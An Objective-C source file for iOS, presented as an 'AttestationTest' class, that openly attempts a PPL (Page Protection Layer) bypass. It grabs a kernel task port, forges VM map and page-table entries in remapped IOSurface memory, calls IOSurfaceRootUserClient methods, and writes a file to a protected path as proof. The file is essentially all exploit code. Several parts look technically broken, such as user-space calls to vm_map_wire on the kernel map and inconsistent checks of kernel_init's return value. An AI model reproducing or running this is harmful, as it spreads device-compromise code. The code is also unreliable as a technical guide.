#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <IOSurface/IOSurfaceObjC.h>
#import <CoreVideo/CoreVideo.h>
#import <sys/socket.h>
#import <sys/ioctl.h>
#import <sys/stat.h>
#import <sys/errno.h>
#import <pthread/pthread.h>
#import <pthread/qos.h>
#import <sys/fcntl.h>
#import <unistd.h>
#import "platform.h"
#import "KernelInterface.h"
#import "KernelUtils.h"

#define FLOW_DIVERT_CONNECT_OUT 2
#define FLOW_DIVERT_INPUT_CONNECT 1
#define IPPROTO_TCP 6
#define IO_SURFACE_CONNECT_TYPE 0
#define IO_SURFACE_CREATE_TYPE 1

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (UITextView *)logTextView {
    static UITextView *textView = nil;
    if (!textView) {
        textView = [[UITextView alloc] initWithFrame:CGRectMake(0, 50, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height - 100)];
        textView.editable = NO;
        textView.backgroundColor = [UIColor blackColor];
        textView.textColor = [UIColor greenColor];
        textView.font = [UIFont fontWithName:@"Menlo" size:12];
        [[UIApplication sharedApplication].keyWindow addSubview:textView];
    }
    return textView;
}

+ (void)log:(NSString *)format, ... {
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    
    NSLog(@"%@", message);
    
    dispatch_async(dispatch_get_main_queue(), ^{
        UITextView *textView = [self logTextView];
        textView.text = [textView.text stringByAppendingFormat:@"%@\n", message];
        [textView scrollRangeToVisible:NSMakeRange(textView.text.length, 0)];
    });
}

+ (void)runTest {
    [self log:@"[INFO] Starting PPL bypass with kernel initialization..."];
    
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    setpriority(PRIO_PROCESS, getpid(), -20);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        if (!IOSurface_init()) {
            [self log:@"[ERROR] Failed to initialize IOSurface subsystem"];
            return;
        }
        [self log:@"[INFO] IOSurface subsystem initialized"];
        
        dispatch_async(dispatch_get_main_queue(), ^{
            kern_return_t kr = kernel_init();
            if (kr != KERN_SUCCESS) {
                [self log:@"[ERROR] Failed to initialize kernel access: %s", mach_error_string(kr)];
                return;
            }
            
            if (kernel_task_port == MACH_PORT_NULL) {
                [self log:@"[ERROR] Failed to obtain kernel task port"];
                return;
            }
            [self log:@"[INFO] Successfully obtained kernel task port"];
            
            CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                                                                          &kCFTypeDictionaryKeyCallBacks,
                                                                          &kCFTypeDictionaryValueCallBacks);
            if (!properties) {
                [self log:@"[ERROR] Failed to create IOSurface properties"];
                return;
            }
            
            int width = 4096;
            int height = 4096;
            int bytesPerElement = 4;
            int bytesPerRow = width * bytesPerElement;
            
            CFNumberRef widthRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &width);
            CFNumberRef heightRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &height);
            CFNumberRef bytesPerElementRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerElement);
            CFNumberRef bytesPerRowRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerRow);
            
            CFDictionarySetValue(properties, kIOSurfaceWidth, widthRef);
            CFDictionarySetValue(properties, kIOSurfaceHeight, heightRef);
            CFDictionarySetValue(properties, kIOSurfaceBytesPerElement, bytesPerElementRef);
            CFDictionarySetValue(properties, kIOSurfaceBytesPerRow, bytesPerRowRef);
            
            IOSurfaceRef surface = IOSurfaceCreate(properties);
            
            CFRelease(widthRef);
            CFRelease(heightRef);
            CFRelease(bytesPerElementRef);
            CFRelease(bytesPerRowRef);
            CFRelease(properties);
            
            if (!surface) {
                [self log:@"[ERROR] Failed to create IOSurface"];
                return;
            }
            
            [self log:@"[INFO] IOSurface created successfully"];
            
            CVPixelBufferRef pixelBuffer = NULL;
            NSDictionary *options = @{
                (NSString*)kCVPixelBufferIOSurfacePropertiesKey : @{},
                (NSString*)kCVPixelBufferWidthKey : @(width),
                (NSString*)kCVPixelBufferHeightKey : @(height),
                (NSString*)kCVPixelBufferBytesPerRowAlignmentKey : @(bytesPerRow)
            };
            
            CVReturn cvResult = CVPixelBufferCreate(kCFAllocatorDefault,
                                                    width, height,
                                                    kCVPixelFormatType_32BGRA,
                                                    (__bridge CFDictionaryRef)options,
                                                    &pixelBuffer);
            
            if (cvResult == kCVReturnSuccess && pixelBuffer) {
                [self log:@"[INFO] Successfully created CVPixelBuffer"];
                IOSurfaceRef cvSurface = CVPixelBufferGetIOSurface(pixelBuffer);
                
                if (cvSurface) {
                    [self log:@"[INFO] Successfully obtained IOSurface from CVPixelBuffer"];
                    
                    if (IOSurfaceLock(cvSurface, kIOSurfaceLockReadOnly, NULL) == kIOReturnSuccess) {
                        size_t bytesPerRow = IOSurfaceGetBytesPerRow(cvSurface);
                        size_t width = IOSurfaceGetWidth(cvSurface);
                        size_t height = IOSurfaceGetHeight(cvSurface);
                        
                        [self log:@"[INFO] Surface dimensions: %zux%zu, bytes per row: %zu",
                         width, height, bytesPerRow];
                        
                        void* baseAddress = IOSurfaceGetBaseAddress(cvSurface);
                        if (baseAddress) {
                            [self log:@"[INFO] Got direct memory access at %p", baseAddress];
                            
                            mach_vm_address_t mapped_addr = 0;
                            vm_prot_t cur_prot, max_prot;
                            
                            kr = vm_remap(mach_task_self(),
                                          &mapped_addr,
                                          IOSurfaceGetAllocSize(cvSurface),
                                          0,
                                          VM_FLAGS_ANYWHERE,
                                          mach_task_self(),
                                          (mach_vm_address_t)baseAddress,
                                          FALSE,
                                          &cur_prot,
                                          &max_prot,
                                          VM_INHERIT_NONE);
                            
                            if (kr == KERN_SUCCESS) {
                                [self log:@"[INFO] Successfully remapped IOSurface memory to 0x%llx", mapped_addr];
                                
                                vm_region_basic_info_data_64_t info;
                                mach_msg_type_number_t info_count = VM_REGION_BASIC_INFO_COUNT_64;
                                mach_port_t object_name;
                                vm_size_t memory_size = IOSurfaceGetAllocSize(cvSurface);
                                
                                kr = vm_region_64(mach_task_self(),
                                                  &mapped_addr,
                                                  &memory_size,
                                                  VM_REGION_BASIC_INFO_64,
                                                  (vm_region_info_t)&info,
                                                  &info_count,
                                                  &object_name);
                                
                                if (kr == KERN_SUCCESS) {
                                    [self log:@"[INFO] Current protection: 0x%x, Max protection: 0x%x",
                                     info.protection, info.max_protection];
                                    
                                    kr = vm_protect(mach_task_self(),
                                                    mapped_addr,
                                                    memory_size,
                                                    FALSE,
                                                    VM_PROT_READ | VM_PROT_WRITE);
                                    
                                    if (kr == KERN_SUCCESS) {
                                        [self log:@"[INFO] Successfully set RW protection on remapped memory"];
                                    } else {
                                        [self log:@"[ERROR] Failed to set memory protection: %s",
                                         mach_error_string(kr)];
                                    }
                                }
                                void* remapped_memory = (void*)mapped_addr;
                                // size_t memory_size = IOSurfaceGetAllocSize(cvSurface);
                                
                                [self log:@"[INFO] Working with remapped memory at %p (size: %zu)", remapped_memory, memory_size];
                                
                                vm_address_t base_addr = 0;
                                vm_size_t alloc_size = PAGE_SIZE * 8;
                                
                                kern_return_t alloc_kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
                                if (alloc_kr == KERN_SUCCESS) {
                                    [self log:@"[INFO] User memory allocated at 0x%llx", base_addr];
                                    
                                    uint64_t *map_copy = (uint64_t *)remapped_memory;
                                    map_copy[0] = 1;
                                    map_copy[1] = 0x102000000;
                                    map_copy[2] = 0x200;
                                    uint64_t *entry = (uint64_t *)(remapped_memory + 0x20);
                                    entry[0] = (uint64_t)(entry + 16);
                                    entry[1] = (uint64_t)(entry + 32);
                                    entry[2] = base_addr;
                                    entry[3] = 1;
                                    uint64_t *next_entry = (uint64_t *)(remapped_memory + 0x40);
                                    next_entry[0] = (uint64_t)entry;
                                    next_entry[1] = 0;
                                    next_entry[2] = base_addr;
                                    next_entry[3] = 0;
                                    
                                    __asm__ volatile("dmb ish" ::: "memory");
                                    
                                    uint64_t kslide = 0;
                                    uint64_t kbase = 0;
                                    
                                    kr = kernel_slide_init();
                                    if (kr == KERN_SUCCESS) {
                                        kslide = kernel_get_slide();
                                        kbase = kernel_get_base();
                                        [self log:@"[INFO] Kernel slide: 0x%llx, base: 0x%llx", kslide, kbase];
                                        uint64_t kernel_map = kernel_read64(kbase + KERNEL_MAP_OFFSET);
                                        if (kernel_map != 0) {
                                            [self log:@"[INFO] Found kernel_map at 0x%llx", kernel_map];
                                            

                                            uint64_t *fake_entry = (uint64_t *)(remapped_memory + 0x100);
                                            fake_entry[0] = kernel_map;
                                            fake_entry[1] = kbase;
                                            fake_entry[2] = kbase + 0x1000;
                                            fake_entry[3] = VM_PROT_ALL;
                                            
                                            __asm__ volatile("dmb ish" ::: "memory");
                                            
                                            kr = vm_map_wire(kernel_map,
                                                             kbase,
                                                             kbase + 0x1000,
                                                             VM_PROT_ALL,
                                                             FALSE);
                                            
                                            if (kr == KERN_SUCCESS) {
                                                [self log:@"[INFO] Successfully gained kernel write access"];
                                                volatile uint64_t *tte = (uint64_t *)remapped_memory;
                                                uint64_t template = 0x60000000000003FFULL |
                                                (1ULL << 10) |
                                                (1ULL << 6)  |
                                                (1ULL << 53);
                                                
                                                for (int i = 0; i < 4; i++) {
                                                    uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
                                                    uint64_t entry = template | page_addr;
                                                    
                                                    tte[i] = entry;
                                                    __asm__ volatile("dmb ish" ::: "memory");
                                                    
                                                    [self log:@"[DEBUG] TTE[%d] = 0x%llx (page: 0x%llx)", i, entry, page_addr];
                                                }
                                                
                                                if (surface) CFRelease(surface);
                                                surface = cvSurface;
                                                CFRetain(surface);
                                            }
                                        }
                                    }
                                    IOSurfaceUnlock(cvSurface, kIOSurfaceLockReadOnly, NULL);
                                }
                            }
                            CVPixelBufferRelease(pixelBuffer);
                        }
                        
                        mach_port_t bootstrap_port;
                        task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
                        
                        io_service_t service = IOServiceGetMatchingService(bootstrap_port,
                                                                           IOServiceMatching("IOSurfaceRoot"));
                        if (service == IO_OBJECT_NULL) {
                            [self log:@"[ERROR] Failed to get IOSurfaceRoot service"];
                            CFRelease(surface);
                            return;
                        }
                        
                        io_connect_t connection;
                        kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
                        IOObjectRelease(service);
                        
                        if (kr != KERN_SUCCESS) {
                            [self log:@"[ERROR] Failed to open IOSurfaceRoot connection"];
                            CFRelease(surface);
                            return;
                        }
                        
                        uint64_t initialScalar[1] = {IOSurfaceGetID(surface)};
                        uint64_t initialScalarOut[1] = {0};
                        uint32_t initialOutputCount = 1;
                        
                        kr = IOConnectCallScalarMethod(connection,
                                                       0,
                                                       initialScalar,
                                                       1,
                                                       initialScalarOut,
                                                       &initialOutputCount);
                        
                        if (kr == KERN_SUCCESS) {
                            [self log:@"[INFO] Successfully used IOSurfaceRootUserClient method"];
                            
                            uint64_t createClientScalar[4] = {
                                IOSurfaceGetID(surface),
                                0,
                                0,
                                (uint64_t)mach_task_self()
                            };
                            uint64_t createClientOutput[1] = {0};
                            uint32_t createClientOutputCount = 1;
                            
                            kr = IOConnectCallScalarMethod(connection,
                                                           5,
                                                           createClientScalar,
                                                           4,
                                                           createClientOutput,
                                                           &createClientOutputCount);
                            
                            if (kr == KERN_SUCCESS) {
                                [self log:@"[INFO] Successfully initialized surface client"];
                            } else {
                                [self log:@"[ERROR] Failed to initialize surface client: %s", mach_error_string(kr)];
                            }
                        } else {
                            [self log:@"[ERROR] IOSurfaceRootUserClient method failed: %s", mach_error_string(kr)];
                        }
                        
                        if (IOSurfaceLock(surface, kIOSurfaceLockReadOnly, NULL) == kIOReturnSuccess) {
                            [self log:@"[INFO] Successfully locked IOSurface"];
                            
                            task_port_t myTaskPort = mach_task_self();
                            pid_t pid;
                            pid_for_task(myTaskPort, &pid);
                            [self log:@"[INFO] Current process ID: %d", pid];
                            
                            CFStringRef testKey = CFSTR("TestKey");
                            uint32_t testValue = 42;
                            CFNumberRef valueRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &testValue);
                            CFDictionaryRef surfaceProps = IOSurfaceCopyAllValues(surface);
                            if (surfaceProps) {
                                [self log:@"[INFO] Successfully accessed IOSurface properties"];
                                CFRelease(surfaceProps);
                            }
                            CFRelease(valueRef);
                            
                            IOSurfaceUnlock(surface, kIOSurfaceLockReadOnly, NULL);
                        }
                        
                        if (!IOSurface_init()) {
                            [self log:@"[ERROR] Failed to initialize IOSurface subsystem"];
                            IOServiceClose(connection);
                            CFRelease(surface);
                            return;
                        }
                        [self log:@"[INFO] IOSurface subsystem initialized"];
                        
                        IOSurface_id = IOSurfaceGetID(surface);
                        
                        uint64_t scalar[4] = {
                            IOSurface_id,
                            0,
                            0,
                            (uint64_t)mach_task_self()
                        };
                        uint64_t scalarOut[1] = {0};
                        uint32_t outputCount = 1;
                        
                        kr = IOConnectCallScalarMethod(IOSurfaceRootUserClient,
                                                       6,
                                                       scalar,
                                                       4,
                                                       scalarOut,
                                                       &outputCount);
                        
                        if (kr == KERN_SUCCESS) {
                            [self log:@"[INFO] Successfully initialized surface client"];
                        } else {
                            [self log:@"[ERROR] Failed to initialize surface client: %s", mach_error_string(kr)];
                        }
                        
                        uint32_t surfaceID = IOSurfaceGetID(surface);
                        uint64_t clientScalar[4] = {
                            surfaceID,
                            0,
                            0,
                            (uint64_t)mach_task_self()
                        };
                        uint64_t clientOutput[1] = {0};
                        uint32_t clientOutputCount = 1;
                        
                        kr = IOConnectCallScalarMethod(connection,
                                                       6,
                                                       clientScalar,
                                                       4,
                                                       clientOutput,
                                                       &clientOutputCount);
                        
                        if (kr == KERN_SUCCESS) {
                            [self log:@"[INFO] Successfully created IOSurfaceClient"];
                            
                            kr = IOConnectCallScalarMethod(connection,
                                                           2,
                                                           &surfaceID,
                                                           1,
                                                           NULL,
                                                           0);
                            
                            if (kr == KERN_SUCCESS) {
                                [self log:@"[INFO] Successfully initialized IOSurfaceClient"];
                            } else {
                                [self log:@"[ERROR] Failed to initialize IOSurfaceClient: %s", mach_error_string(kr)];
                            }
                        } else {
                            [self log:@"[ERROR] Failed to create IOSurfaceClient: %s", mach_error_string(kr)];
                        }
                        
                        CFNumberRef surfaceIDRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &surfaceID);
                        CFStringRef lookupKey = CFSTR("IOSurfaceRootUserClient");
                        CFDictionaryRef lookupDict = CFDictionaryCreate(kCFAllocatorDefault,
                                                                        (const void **)&lookupKey,
                                                                        (const void **)&surfaceIDRef,
                                                                        1,
                                                                        &kCFTypeDictionaryKeyCallBacks,
                                                                        &kCFTypeDictionaryValueCallBacks);
                        CFRelease(surfaceIDRef);
                        
                        IOSurfaceRef retrievedSurface = IOSurfaceLookup(surfaceID);
                        if (!retrievedSurface) {
                            [self log:@"[ERROR] Failed to retrieve IOSurface through lookup"];
                            CFRelease(lookupDict);
                            CFRelease(surface);
                            return;
                        }
                        [self log:@"[INFO] Successfully retrieved IOSurface through lookup"];
                        
                        if (!IOSurface_init()) {
                            [self log:@"[ERROR] Failed to initialize IOSurface"];
                            IOServiceClose(connection);
                            CFRelease(lookupDict);
                            CFRelease(retrievedSurface);
                            CFRelease(surface);
                            return;
                        }
                        [self log:@"[INFO] IOSurface initialized successfully"];
                        
                        if (!kernel_init()) {
                            [self log:@"[ERROR] Failed to initialize kernel access"];
                            IOServiceClose(connection);
                            CFRelease(lookupDict);
                            CFRelease(retrievedSurface);
                            CFRelease(surface);
                            return;
                        }
                        
                        [self log:@"[INFO] Kernel access initialized successfully"];
                        
                        if (kernel_task_port == MACH_PORT_NULL) {
                            [self log:@"[ERROR] No kernel task port"];
                            IOServiceClose(connection);
                            return;
                        }
                        
                        task_port_t myTaskPort = mach_task_self();
                        pid_t currentPid;
                        pid_for_task(myTaskPort, &currentPid);
                        
                        uint64_t finalInputScalar[3] = {
                            IOSurfaceGetID(surface),
                            (uint64_t)currentPid,
                            0
                        };
                        uint64_t finalOutput[1] = {0};
                        uint32_t finalOutputCount = 1;
                        
                        kr = IOConnectCallScalarMethod(connection,
                                                       6,
                                                       finalInputScalar,
                                                       3,
                                                       finalOutput,
                                                       &finalOutputCount);
                        
                        if (kr == KERN_SUCCESS) {
                            [self log:@"[INFO] Successfully created IOSurfaceClient"];
                            
                            if (!IOSurface_init()) {
                                [self log:@"[ERROR] Failed to initialize IOSurface"];
                                IOServiceClose(connection);
                                CFRelease(surface);
                                return;
                            }
                            [self log:@"[INFO] IOSurface initialized successfully"];
                        } else {
                            [self log:@"[ERROR] Failed to create IOSurfaceClient: %s", mach_error_string(kr)];
                        }
                        
                        uint64_t kernel_addr = kernel_vm_allocate(PAGE_SIZE * 8);
                        if (kernel_addr == -1) {
                            [self log:@"[ERROR] Kernel memory allocation failed"];
                            IOServiceClose(connection);
                            return;
                        }
                        [self log:@"[INFO] Kernel memory allocated at 0x%llx", kernel_addr];
                        
                        vm_address_t base_addr = 0;
                        vm_size_t alloc_size = PAGE_SIZE * 8;
                        
                        kern_return_t alloc_kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
                        if (alloc_kr != KERN_SUCCESS) {
                            [self log:@"[ERROR] User memory allocation failed"];
                            kernel_vm_deallocate(kernel_addr, PAGE_SIZE * 8);
                            IOServiceClose(connection);
                            return;
                        }
                        [self log:@"[INFO] User memory allocated at 0x%llx", base_addr];
                        
                        @try {
                            
                            mach_vm_address_t mapped_addr = 0;
                            vm_prot_t cur_prot, max_prot;
                            kr = vm_remap(mach_task_self(),
                                          &mapped_addr,
                                          PAGE_SIZE * 4,
                                          0,
                                          VM_FLAGS_ANYWHERE,
                                          mach_task_self(),
                                          kernel_addr,
                                          FALSE,
                                          &cur_prot,
                                          &max_prot,
                                          VM_INHERIT_NONE);
                            
                            if (kr != KERN_SUCCESS || mapped_addr == 0) {
                                [self log:@"[ERROR] Memory remapping failed: %s", mach_error_string(kr)];
                                return;
                            }
                            [self log:@"[INFO] Memory remapped at 0x%llx", mapped_addr];
                            
                            volatile uint64_t *tte = (uint64_t *)mapped_addr;
                            uint64_t template = 0x60000000000003FFULL |
                            (1ULL << 10) |
                            (1ULL << 6)  |
                            (1ULL << 53);
                            
                            for (int i = 0; i < 4; i++) {
                                uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
                                uint64_t entry = template | page_addr;
                                
                                kernel_write64(kernel_addr + (i * 8), entry);
                                
                                tte[i] = entry;
                                __asm__ volatile("dmb ish" ::: "memory");
                                
                                [self log:@"[DEBUG] TTE[%d] = 0x%llx (page: 0x%llx)", i, entry, page_addr];
                            }
                            
                            kr = vm_protect(mach_task_self(), base_addr, PAGE_SIZE * 4, FALSE,
                                            VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                            
                            if (kr == KERN_SUCCESS) {
                                [self log:@"[INFO] Permission escalation successful"];
                                
                                NSString *testPath = @"/private/var/mobile/test.txt";
                                NSString *testContent = @"PPL Bypass Test Successful";
                                NSError *error = nil;
                                
                                [testContent writeToFile:testPath
                                              atomically:YES
                                                encoding:NSUTF8StringEncoding
                                                   error:&error];
                                
                                if (!error) {
                                    [self log:@"[SUCCESS] PPL bypass confirmed - wrote to protected path"];
                                } else {
                                    [self log:@"[ERROR] Permission escalation failed: %s (%d)", mach_error_string(kr), kr]; // thx mattycbtw
                                }
                            }
                            
                            vm_deallocate(mach_task_self(), mapped_addr, PAGE_SIZE * 4);
                        } @catch (NSException *e) {
                            [self log:@"[ERROR] Exception: %@", e];
                        }
                        
                        kernel_vm_deallocate(kernel_addr, PAGE_SIZE * 8);
                        vm_deallocate(mach_task_self(), base_addr, alloc_size);
                        CFRelease(lookupDict);
                        CFRelease(retrievedSurface);
                        CFRelease(surface);
                        IOServiceClose(connection);
                    }
                }
            }
        });
    });
}
@end
